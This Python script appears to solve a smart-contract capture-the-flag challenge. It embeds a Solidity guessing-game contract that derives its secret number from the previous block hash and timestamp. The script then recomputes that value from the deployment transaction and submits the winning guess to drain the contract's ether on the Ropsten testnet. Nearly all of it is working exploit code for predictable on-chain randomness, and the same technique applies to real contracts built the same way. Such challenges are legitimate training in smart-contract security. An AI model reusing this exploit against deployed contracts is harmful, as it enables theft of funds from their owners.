from solcx import compile_source
from helper import get_provider_and_account

w3, acct = get_provider_and_account()

# solidity source code
compiled_target = compile_source(

"""
pragma solidity ^0.4.21;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
"""
)
contract_id, contract_interface = compiled_target.popitem()

# get abi
abi = contract_interface["abi"]

guessing_game = w3.eth.contract(
    address="0xD2fbaB718C40F270178dB46daDf59d19A97e099f",
    abi=abi
)    

# get the transaction hash of the contract deployment to reverse engineer the "random" hash
transaction_receipt = w3.eth._get_transaction("0x3ffc3c5a760500d495ea755774401af34eb9b8607529928dc104751308c533bc")
block_number = transaction_receipt.blockNumber

previous_block_hash = w3.eth.get_block(block_number - 1).hash # block.blockhash(block.number - 1)

timestamp = w3.eth.get_block(block_number).timestamp # now
answer_hash = w3.solidityKeccak(["bytes32", "uint256"], [previous_block_hash.hex(), timestamp]).hex() # 256 bit hexidecimal
answer_hash = answer_hash[-2:] # get 8 lowest order bits (last 2 hex)
num = w3.toInt(hexstr = answer_hash) 

# send transaction to contract invoking guess with uint8 value that has identical hash to answer 
tx_hash = guessing_game.functions.guess(num).transact({'value': w3.toWei(1, 'ether')})
print(f"View on Etherscan: https://ropsten.etherscan.io/tx/{tx_hash.hex()}")

tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

print(f"Completed: {guessing_game.functions.isComplete().call()}")